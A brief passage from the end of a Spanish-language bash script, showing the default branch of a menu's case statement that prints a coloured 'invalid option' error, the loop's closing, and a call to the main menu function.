echo -e "$rojo(ERROR)$azul $REPLY $verde Opcion no valida $verde"
;;
esac 
done
}
menu_principal
